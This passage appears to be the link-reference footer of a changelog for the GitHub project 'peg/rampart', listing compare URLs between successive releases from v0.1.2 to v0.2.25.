[0.2.25]: https://github.com/peg/rampart/compare/v0.2.24...v0.2.25
[0.2.24]: https://github.com/peg/rampart/compare/v0.2.23...v0.2.24
[0.2.23]: https://github.com/peg/rampart/compare/v0.2.22...v0.2.23
[0.2.22]: https://github.com/peg/rampart/compare/v0.2.21...v0.2.22
[0.2.21]: https://github.com/peg/rampart/compare/v0.2.2...v0.2.21
[0.2.2]: https://github.com/peg/rampart/compare/v0.2.0...v0.2.2
[0.2.0]: https://github.com/peg/rampart/compare/v0.1.14...v0.2.0
[0.1.14]: https://github.com/peg/rampart/compare/v0.1.13...v0.1.14
[0.1.13]: https://github.com/peg/rampart/compare/v0.1.12...v0.1.13
[0.1.12]: https://github.com/peg/rampart/compare/v0.1.11...v0.1.12
[0.1.11]: https://github.com/peg/rampart/compare/v0.1.8...v0.1.11
[0.1.8]: https://github.com/peg/rampart/compare/v0.1.7...v0.1.8
[0.1.7]: https://github.com/peg/rampart/compare/v0.1.6...v0.1.7
[0.1.6]: https://github.com/peg/rampart/compare/v0.1.5...v0.1.6
[0.1.5]: https://github.com/peg/rampart/compare/v0.1.3...v0.1.5
[0.1.3]: https://github.com/peg/rampart/compare/v0.1.2...v0.1.3
[0.1.2]: https://github.com/peg/rampart/releases/tag/v0.1.2
